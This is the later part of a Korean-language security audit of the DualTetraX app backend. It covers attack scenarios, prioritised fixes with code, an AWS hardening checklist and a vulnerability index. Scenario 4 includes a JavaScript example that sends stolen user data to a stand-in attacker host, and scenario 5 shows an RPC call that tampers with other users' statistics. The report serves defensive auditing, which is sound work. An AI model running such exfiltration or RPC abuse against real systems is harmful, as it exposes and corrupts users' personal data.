- 또는 Supabase Auth의 세션 관리 기능으로 모든 세션 종료
- 중요 작업 시 토큰 재검증

### 10.4 시나리오 4: CORS 취약점을 이용한 Cross-Site 데이터 탈취

**공격 벡터**:
1. 공격자가 악성 웹사이트 생성 (예: `evil-beauty.com`)
2. DualTetraX 사용자를 유인 (피싱 이메일, 소셜 미디어 등)
3. 악성 사이트에서 JavaScript 코드 실행:
   ```javascript
   // CORS가 *이므로 cross-origin 요청 허용
   // XSS로 탈취한 토큰 또는 다른 방법으로 획득한 토큰 사용
   fetch('https://qp-dualtetrax-api.vercel.app/api/devices', {
     headers: { 'Authorization': 'Bearer ' + stolenToken }
   }).then(r => r.json()).then(data => {
     // 사용자의 디바이스 정보, 세션 데이터 탈취
     fetch('https://evil-beauty.com/collect', { method: 'POST', body: JSON.stringify(data) });
   });
   ```
4. 사용자의 디바이스 목록, 사용 이력, 통계 데이터 탈취

**영향도**: **High** - 개인 건강/뷰티 데이터 유출

**발생 가능성**: **Medium** - CORS `*`와 토큰 탈취가 결합되어야 함. 하지만 CORS `*`는 다른 취약점과 결합하여 위험을 크게 증폭시킨다.

**대응 방안**:
- CORS Origin을 특정 도메인으로 제한
- CSP 헤더 추가
- SameSite 쿠키 속성 활용

### 10.5 시나리오 5: aggregate_daily_stats RPC 직접 호출을 통한 통계 조작

**공격 벡터**:
1. 공격자가 정상 계정으로 로그인
2. Supabase JS Client를 직접 사용하여 RPC 호출:
   ```javascript
   const { data, error } = await supabase.rpc('aggregate_daily_stats', {
     p_user_id: '타인의-uuid',
     p_device_id: '타인의-device-uuid',
     p_date: '2026-02-08'
   });
   ```
3. `SECURITY DEFINER` 함수이므로 RLS를 우회하여 실행됨
4. 타인의 통계 데이터가 재계산되어 변조됨

**영향도**: **Medium** - 다른 사용자의 통계 데이터 무결성 훼손

**발생 가능성**: **High** - Supabase `anon_key`만 있으면 누구나 RPC 호출 가능

**대응 방안**:
- `aggregate_daily_stats` 함수 내에서 `auth.uid() = p_user_id` 검증 추가
- 또는 RPC에 대한 별도 RLS 정책 설정
- 또는 `SECURITY INVOKER`로 변경하여 호출자 권한으로 실행

### 10.6 시나리오 6: Health 엔드포인트를 이용한 정찰 및 서비스 모니터링

**공격 벡터**:
1. 공격자가 `/api/health`와 `/api/ping`을 주기적으로 호출
2. 서비스 상태, DB/Redis 연결 상태, 환경 변수 설정 여부 모니터링
3. 서비스 장애 발생 시 에러 메시지에서 내부 정보 수집
4. 수집한 정보를 바탕으로 타겟팅된 공격 수행

**영향도**: **Low** - 정보 수집 단계

**발생 가능성**: **High** - 인증 없이 접근 가능

**대응 방안**:
- `/api/ping` 제거 또는 인증 필수
- `/api/health`에서 에러 상세 제거 (status만 반환)
- 또는 `/api/health`에 IP 화이트리스트 적용

---

## 11. 보안 권고사항 (Recommendations)

### 11.1 Critical - 즉시 수정 필요

#### C-01: CORS 정책 수정

**관련 취약점**: SEC-API-09, SEC-FE-03

**파일**: `/backend/vercel.json`

**현재**:
```json
{ "key": "Access-Control-Allow-Origin", "value": "*" }
```

**수정 방안**: 허용된 도메인만 지정
```json
{
  "headers": [
    {
      "source": "/api/(.*)",
      "headers": [
        { "key": "Access-Control-Allow-Origin", "value": "https://qp-dualtetrax-web.vercel.app" },
        { "key": "Access-Control-Allow-Methods", "value": "GET, POST, PUT, DELETE, OPTIONS" },
        { "key": "Access-Control-Allow-Headers", "value": "Content-Type, Authorization" },
        { "key": "Access-Control-Allow-Credentials", "value": "true" }
      ]
    }
  ]
}
```

모바일 앱에서도 API를 호출하므로, 모바일은 CORS 정책이 적용되지 않는다 (브라우저가 아니므로). 따라서 웹 도메인만 지정하면 된다.

#### C-02: `/api/ping` 제거 또는 보안 강화

**관련 취약점**: SEC-API-01

**수정 방안**: 프로덕션에서 `/api/ping` 엔드포인트 제거, 또는 인증 필수화
```typescript
export default async function handler(req: VercelRequest, res: VercelResponse) {
  // 프로덕션에서는 비활성화
  if (process.env.NODE_ENV === 'production') {
    return res.status(404).json({ error: 'Not found' });
  }
  // ...
}
```

#### C-03: `/api/health` 에러 정보 제거

**관련 취약점**: SEC-API-02

**수정 방안**: 에러 상세를 제거하고 상태만 반환
```typescript
return res.status(200).json({
  status: dbOk && redisOk ? 'healthy' : 'degraded',
  timestamp: new Date().toISOString(),
});
// 에러 상세는 서버 로그에만 기록
if (!dbOk) console.error('[HEALTH] DB error:', dbError);
if (!redisOk) console.error('[HEALTH] Redis error:', redisError);
```

#### C-04: `aggregate_daily_stats` 함수 보안 강화

**관련 취약점**: SEC-DB-04

**수정 방안**: 함수 내 권한 검증 추가
```sql
CREATE OR REPLACE FUNCTION aggregate_daily_stats(
  p_user_id UUID,
  p_device_id UUID,
  p_date DATE
)
RETURNS void AS $$
BEGIN
  -- 호출자가 해당 사용자인지 확인
  IF auth.uid() IS NULL OR auth.uid() != p_user_id THEN
    -- service_role은 auth.uid()가 NULL이므로 별도 처리
    IF NOT (SELECT current_setting('request.jwt.claims', true)::json->>'role' = 'service_role') THEN
      RAISE EXCEPTION 'Unauthorized: can only aggregate own stats';
    END IF;
  END IF;

  -- 기존 로직...
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
```

### 11.2 High - Phase 1 내 수정 권장

#### H-01: Rate Limiting 도입

**관련 취약점**: SEC-API-08

**수정 방안**: Upstash Redis 기반 Rate Limiting 구현
```typescript
// lib/rateLimit.ts
import { redis } from './redis';

export async function checkRateLimit(
  identifier: string,
  limit: number = 60,
  window: number = 60
): Promise<boolean> {
  const key = `rl:${identifier}`;
  const current = await redis.incr(key);
  if (current === 1) {
    await redis.expire(key, window);
  }
  return current <= limit;
}

// 각 핸들러에서 사용:
const ip = req.headers['x-forwarded-for'] || 'unknown';
if (!(await checkRateLimit(`${ip}:upload`, 10, 60))) {
  return res.status(429).json({ error: 'Too many requests' });
}
```

#### H-02: 로그아웃 시 Refresh Token 무효화

**관련 취약점**: SEC-AUTH-05

**파일**: `/backend/api/auth/logout.ts`

**수정 방안**:
```typescript
// logout.ts
await blacklistToken(tokenHash, exp);
// Refresh Token도 무효화
await supabaseAdmin.auth.admin.signOut(user.id);
```

#### H-03: Redis 장애 시 Fail-Safe 처리

**관련 취약점**: SEC-AUTH-03

**수정 방안**: Redis 장애 시 보안 우선(fail-closed) 또는 가용성 우선(fail-open) 정책 결정 필요
```typescript
// auth.ts - Fail-closed 방식 (보안 우선)
try {
  const tokenHash = hashToken(token);
  if (await isTokenBlacklisted(tokenHash)) {
    res.status(401).json({ error: 'Token has been revoked' });
    return null;
  }
} catch (redisError) {
  console.error('[AUTH] Redis check failed:', redisError);
  // 보안 우선: Redis 장애 시 요청 거부
  res.status(503).json({ error: 'Service temporarily unavailable' });
  return null;
}
```

#### H-04: CSP 헤더 추가

**관련 취약점**: SEC-FE-05

**수정 방안**: `next.config.mjs`에 보안 헤더 추가
```javascript
const nextConfig = {
  async headers() {
    return [
      {
        source: '/(.*)',
        headers: [
          {
            key: 'Content-Security-Policy',
            value: [
              "default-src 'self'",
              "script-src 'self' 'unsafe-inline'",  // 테마 스크립트용 (향후 nonce로 교체)
              "style-src 'self' 'unsafe-inline'",
              "img-src 'self' data: https:",
              "font-src 'self' https://fonts.gstatic.com",
              "connect-src 'self' https://qp-dualtetrax-api.vercel.app https://*.supabase.co",
              "frame-ancestors 'none'",
              "base-uri 'self'",
              "form-action 'self'",
            ].join('; ')
          },
          { key: 'X-Content-Type-Options', value: 'nosniff' },
          { key: 'X-Frame-Options', value: 'DENY' },
          { key: 'X-XSS-Protection', value: '1; mode=block' },
          { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
          { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
        ],
      },
    ];
  },
};
export default nextConfig;
```

#### H-05: 환경 분리

**관련 취약점**: SEC-INF-05

**수정 방안**:
- Supabase 프로젝트를 개발/프로덕션으로 분리
- Vercel 환경별 환경 변수 설정 (Preview, Production)
- `vercel.json` CORS를 환경별로 다르게 설정

#### H-06: GDPR 삭제 API 구현

**관련 취약점**: SEC-GDPR-03

계정 삭제 API를 Phase 1에 구현해야 한다:
```typescript
// api/profile/delete.ts
export default async function handler(req, res) {
  const user = await authenticate(req, res);
  if (!user) return;

  // 1. Supabase Auth에서 사용자 삭제 (CASCADE로 profiles 및 관련 데이터 삭제)
  const { error } = await supabaseAdmin.auth.admin.deleteUser(user.id);
  if (error) return res.status(500).json({ error: 'Failed to delete account' });

  // 2. Redis에서 관련 데이터 정리
  // 3. 로그아웃 처리
  return res.status(200).json({ message: 'Account deleted successfully' });
}
```

#### H-07: AuthUser에 role 포함

**관련 취약점**: SEC-AUTH-07

**수정 방안**: 인증 시 프로필에서 role 조회
```typescript
export interface AuthUser {
  id: string;
  email: string;
  role: 'user' | 'admin';
}

export async function authenticate(req, res): Promise<AuthUser | null> {
  // ... 기존 토큰 검증 ...

  // 프로필에서 role 조회
  const { data: profile } = await supabaseAdmin
    .from('profiles')
    .select('role')
    .eq('id', data.user.id)
    .single();

  return {
    id: data.user.id,
    email: data.user.email || '',
    role: (profile?.role as 'user' | 'admin') || 'user',
  };
}
```

### 11.3 Medium - 계획된 일정 내 수정

#### M-01: `battery_samples` 배열 크기 제한

**관련 취약점**: SEC-API-04

```typescript
// validate.ts
battery_samples: z.array(BatterySampleSchema).max(500).optional().default([]),
```

#### M-02: `device_mode` 유효값 검증

**관련 취약점**: SEC-API-06

```typescript
// validate.ts
device_mode: z.number().int().refine(
  (v) => [0x01, 0x02, 0x03, 0x04, 0x11, 0x12, 0x13, 0x14, 0x21].includes(v),
  { message: 'Invalid device mode' }
),
```

#### M-03: 시리얼 번호 형식 검증 강화

**관련 취약점**: SEC-API-05

```typescript
// validate.ts
serial_number: z.string()
  .min(1).max(100)
  .regex(/^DT-\d{4}-\d{3,6}$/, 'Invalid serial number format'),
```

#### M-04: 에러 메시지 제네릭화

**관련 취약점**: SEC-API-10

```typescript
// 모든 엔드포인트의 에러 핸들링
if (error) {
  console.error('[API] DB error:', error); // 서버 로그에만 기록
  return res.status(500).json({ error: 'Internal server error' });
}
```

#### M-05: PII 암호화

**관련 취약점**: SEC-DB-06, SEC-DB-07

`profiles` 테이블의 `name`, `date_of_birth`와 `consent_records`의 `ip_address`에 대해 어플리케이션 레벨 암호화를 적용해야 한다. Supabase의 `pgsodium` 확장 또는 Node.js의 `crypto` 모듈을 활용할 수 있다.

#### M-06: 해시 절단 제거

**관련 취약점**: SEC-AUTH-02

```typescript
// auth.ts
export function hashToken(token: string): string {
  return createHash('sha256').update(token).digest('hex'); // 전체 64자 사용
}
```

#### M-07: `total_sessions` Atomic 업데이트

**관련 취약점**: SEC-SYNC-04

```typescript
// upload.ts - Atomic 증가
await supabaseAdmin.rpc('increment_device_sessions', {
  p_device_id: body.device_id,
  p_count: uploaded
});
```

```sql
-- DB 함수 추가
CREATE OR REPLACE FUNCTION increment_device_sessions(p_device_id UUID, p_count INTEGER)
RETURNS void AS $$
BEGIN
  UPDATE devices
  SET total_sessions = total_sessions + p_count,
      last_synced_at = now()
  WHERE id = p_device_id;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
```

### 11.4 Low - 개선 사항

#### L-01: 동시 세션 제한

**관련 취약점**: SEC-AUTH-06

향후 계정당 최대 동시 세션 수를 제한하는 로직을 고려한다.

#### L-02: JWT 로컬 검증

**관련 취약점**: SEC-AUTH-01

Supabase JWKS를 주기적으로 캐시하여, 토큰 서명을 로컬에서 검증한 후 사용자 정보만 DB에서 조회하는 방식으로 성능과 안정성을 개선한다.

#### L-03: 의존성 감사 자동화

```json
// package.json에 추가
"scripts": {
  "audit": "npm audit --production",
  "audit:fix": "npm audit fix"
}
```

CI/CD 파이프라인에 `npm audit` 실행을 추가한다.

#### L-04: 세션 데이터 현실성 검증

```typescript
// validate.ts - 추가 검증
working_duration: z.number().int().min(0).max(600),  // 최대 10분
pause_duration: z.number().int().min(0).max(600),
```

#### L-05: `dangerouslySetInnerHTML` 제거

테마 초기화 스크립트를 별도의 `<script>` 파일로 분리하여 CSP와 호환되도록 한다.

---

## 12. AWS 전환 시 보안 체크리스트

### 12.1 VPC 및 네트워크

- [ ] **VPC 설계**: Public/Private Subnet 분리
  - Public Subnet: ALB, NAT Gateway
  - Private Subnet: ECS Tasks, RDS, ElastiCache
- [ ] **Security Groups**:
  - ALB SG: 인바운드 80/443만 허용
  - ECS SG: ALB SG에서의 인바운드만 허용
  - RDS SG: ECS SG에서의 5432만 허용
  - ElastiCache SG: ECS SG에서의 6379만 허용
- [ ] **Network ACL**: 불필요한 포트 차단
- [ ] **VPC Flow Logs**: 네트워크 트래픽 모니터링 활성화

### 12.2 WAF 설정

- [ ] **AWS WAF** 규칙 설정:
  - SQL Injection 탐지 규칙
  - XSS 탐지 규칙
  - Rate Limiting (IP당 초당 100 요청)
  - 지역 기반 차단 (필요 시)
  - Bot 탐지
- [ ] **DDoS Protection**: AWS Shield Standard (기본 포함)
- [ ] **Custom Rule**: 특정 API 경로별 Rate Limiting
  - `/api/auth/*`: 분당 10회
  - `/api/sessions/upload`: 분당 30회
  - `/api/stats/*`: 분당 60회

### 12.3 Secrets Manager

- [ ] **AWS Secrets Manager**에 저장할 항목:
  - DB 연결 정보 (host, port, user, password, database)
  - Redis 연결 정보
  - JWT 서명 키
  - API 키 (Supabase → 자체 Auth 전환 시)
  - OAuth Client Secret (Google, Apple)
  - FCM/APNs 인증 정보
- [ ] **자동 로테이션**: DB 비밀번호 90일 자동 교체
- [ ] **ECS Task Definition**: Secrets Manager ARN으로 환경 변수 주입
  ```json
  "secrets": [
    {
      "name": "DB_PASSWORD",
      "valueFrom": "arn:aws:secretsmanager:ap-northeast-2:xxx:secret:dualtetrax/db-xxx"
    }
  ]
  ```

### 12.4 IAM 최소 권한 원칙

- [ ] **ECS Task Role**:
  - S3: 특정 버킷의 특정 접두사만 읽기/쓰기
  - Secrets Manager: 특정 시크릿만 읽기
  - SQS: 특정 큐만 송수신
  - CloudWatch: 로그 쓰기만
- [ ] **ECS Execution Role**: ECR 풀, CloudWatch 로그 생성만
- [ ] **Lambda Role**: SQS 트리거, CloudWatch 로그만
- [ ] **개발자 IAM**: MFA 필수, 프로덕션 리소스 읽기 전용
- [ ] **서비스 계정**: 프로그래밍 방식 접근용 별도 IAM 사용자

### 12.5 네트워크 분리 (Public/Private Subnets)

```
                Internet
                   |
            [Internet Gateway]
                   |
    +--------------+---------------+
    |       Public Subnet          |
    |   +-------+  +----------+   |
    |   |  ALB  |  |  NAT GW  |   |
    |   +-------+  +----------+   |
    +--------------+---------------+
                   |
    +--------------+---------------+
    |      Private Subnet 1        |
    |   +----------+  +--------+  |
    |   | ECS API  |  | ECS Web|  |
    |   +----------+  +--------+  |
    +--------------+---------------+
                   |
    +--------------+---------------+
    |      Private Subnet 2        |
    |   +------+  +-----------+   |
    |   | RDS  |  |ElastiCache|   |
    |   +------+  +-----------+   |
    +------------------------------+
```

### 12.6 추가 보안 항목

- [ ] **RDS 암호화**: At-rest 암호화 (AES-256) 활성화
- [ ] **RDS SSL**: 전송 중 암호화 (SSL/TLS) 강제
- [ ] **ElastiCache 암호화**: At-rest + In-transit 암호화
- [ ] **S3 버킷 정책**: 퍼블릭 접근 차단, 버전 관리 활성화
- [ ] **CloudTrail**: AWS API 호출 감사 로그
- [ ] **GuardDuty**: 위협 탐지 서비스 활성화
- [ ] **Config Rules**: 보안 규정 준수 자동 검사
- [ ] **백업 전략**: RDS 자동 백업 (7일), 수동 스냅샷 (월 1회)
- [ ] **인증서 관리**: ACM으로 SSL 인증서 관리 (자동 갱신)
- [ ] **로그 보존**: CloudWatch Logs 보존 기간 설정 (최소 90일)

---

## 부록: 취약점 식별자 색인

| ID | 등급 | 제목 | 섹션 |
|----|------|------|------|
| SEC-API-01 | Critical | ping 엔드포인트 환경 정보 노출 | 3.1.1 |
| SEC-API-08 | Critical | Rate Limiting 부재 | 3.3 |
| SEC-API-09 | Critical | CORS 전면 개방 | 3.4 |
| SEC-DB-08 | Critical | service_role_key 유출 시 전체 DB 접근 | 4.5 |
| SEC-AUTH-03 | High | Redis 장애 시 에러 핸들링 부재 | 2.2 |
| SEC-AUTH-05 | High | Refresh Token 미무효화 | 2.4 |
| SEC-AUTH-07 | High | 관리자 역할 확인 미구현 | 2.5 |
| SEC-API-02 | High | health 엔드포인트 에러 정보 노출 | 3.1.2 |
| SEC-API-03 | High | supabaseAdmin RLS 우회 사용 | 3.1.3 |
| SEC-DB-01 | High | service_role_key 기반 RLS 완전 우회 | 4.1 |
| SEC-DB-04 | High | aggregate_daily_stats 파라미터 검증 부재 | 4.2 |
| SEC-FE-03 | High | CSRF 보호 미비 (CORS *와 결합) | 8.2 |
| SEC-FE-05 | High | CSP 헤더 부재 | 8.4 |
| SEC-GDPR-03 | High | 계정 삭제 API 미구현 | 9.3 |
| SEC-INF-05 | High | 환경 분리 미흡 | 5.5 |
| SEC-OTA-02 | High | 펌웨어 다운로드 URL 보안 미설계 | 7.2 |
| SEC-OTA-03 | High | 롤백 공격 방지 미설계 | 7.3 |
| SEC-SYNC-03 | High | 배치 업로드 부분 실패 트랜잭션 미처리 | 6.3 |
| SEC-OTA-01 | Critical | 펌웨어 바이너리 무결성 검증 미설계 | 7.1 |
| SEC-AUTH-01 | Medium | 토큰 검증 외부 서비스 완전 의존 | 2.1 |
| SEC-AUTH-02 | Medium | 해시 절단 (128비트만 사용) | 2.2 |
| SEC-AUTH-04 | Medium | OAuth 구현 시 보안 고려사항 | 2.3 |
| SEC-API-04 | Medium | battery_samples 크기 무제한 | 3.1.3 |
| SEC-API-05 | Medium | 시리얼 번호 형식 검증 부재 | 3.1.4 |
| SEC-API-06 | Medium | device_mode 유효값 미검증 | 3.2 |
| SEC-API-10 | Medium | 에러 메시지 정보 노출 | 3.5 |
| SEC-DB-02 | Medium | daily_statistics INSERT RLS 부재 | 4.1 |
| SEC-DB-05 | Medium | 클라이언트 UUID PK | 4.3 |
| SEC-DB-06 | Medium | PII 평문 저장 | 4.4 |
| SEC-DB-07 | Medium | IP 주소 평문 저장 | 4.4 |
| SEC-FE-01 | Medium | dangerouslySetInnerHTML 사용 | 8.1 |
| SEC-FE-04 | Medium | localStorage 토큰 저장 | 8.3 |
| SEC-GDPR-01 | Medium | 데이터 최소화 원칙 미준수 | 9.1 |
| SEC-GDPR-02 | Medium | 동의 관리 API 미구현 | 9.2 |
| SEC-INF-02 | Medium | Redis 토큰 유출 위험 | 5.2 |
| SEC-INF-03 | Medium | anon_key 노출에 의한 RPC 직접 호출 | 5.3 |
| SEC-OTA-04 | Medium | BLE OTA MITM 위험 | 7.4 |
| SEC-SYNC-01 | Medium | 서버 측 데이터 무결성 검증 부재 | 6.1 |
| SEC-SYNC-04 | Medium | total_sessions Race Condition | 6.4 |
| SEC-AUTH-06 | Low | 동시 세션 미제한 | 2.4 |
| SEC-API-07 | Low | termination_reason 유효값 미검증 | 3.2 |
| SEC-DB-03 | Low | SECURITY DEFINER 함수 권한 | 4.2 |
| SEC-FE-02 | Low | React 기본 이스케이핑 의존 | 8.1 |
| SEC-FE-06 | Low | 의존성 감사 부재 | 8.5 |
| SEC-GDPR-04 | Low | 데이터 이동성 API 미구현 | 9.4 |
| SEC-INF-01 | Low | 환경 변수 trim 워크어라운드 | 5.1 |
| SEC-INF-04 | Low | API URL 하드코딩 | 5.4 |
| SEC-SYNC-02 | Low | UUID 중복 제거 부작용 | 6.2 |

---

**보고서 끝**

*본 보고서는 2026-02-08 시점의 코드베이스를 기준으로 작성되었습니다. 새로운 기능 추가 또는 인프라 변경 시 재검토가 필요합니다.*
